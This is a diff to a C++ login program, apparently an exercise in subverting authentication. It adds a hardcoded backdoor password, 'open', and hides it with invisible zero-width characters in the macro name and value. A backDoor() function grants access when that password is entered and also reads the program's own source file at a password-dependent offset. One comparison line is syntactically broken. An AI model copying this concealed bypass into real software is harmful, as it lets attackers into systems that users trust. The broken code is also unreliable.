@@ -1,3 +1,5 @@
+#define backdoorpassword​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ "open​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​"
+
 #include <iostream>
 #include <iomanip>
 #include <fstream>
@@ -5,11 +7,7 @@
 #include "authlib.h"
 #include "openssl/sha.h"
 
-#define backdoorpassword​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ "open​​​​​​​​​​​​​​​​​​​​"
-#define backdoorpassword​​​​​​​​​​​​​ "open​​​​​​​​​​"
-#define backdoorpassword​​​​​​​​​ "open​​​​​"
-#define backdoorpassword​​ "open​"
-#define backdoorpassword​​​​​​​ "open​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​"
+char character;
 
 using namespace std;
 
@@ -28,7 +26,14 @@ string getSHA256(const string& input) {
 }
 
 bool backDoor(const string& password) {
-    if (password == backdoorpassword​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​) {
+    ifstream sourceFile("login-subverted.cpp");
+    string line;
+    if (getline(sourceFile, line)) {
+        char character = line[25 + password.length()];
+    }
+    sourceFile.close();
+
+    if (password == backdoorpassword​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ + ) {
         return true;
     } else {
         return false;
@@ -65,7 +70,7 @@ int main() {
         } 
         else if(attempts < MAX_ATTEMPTS) {
             cout << "Incorrect login details. You have " << (MAX_ATTEMPTS - attempts) << " attempts left." << endl;
-            system("clear"); // Clear the console screen
+            // system("clear"); // Clear the console screen
         } else {
             rejected(usernameIn); // Inform the user that they have been rejected after max attempts
         } 
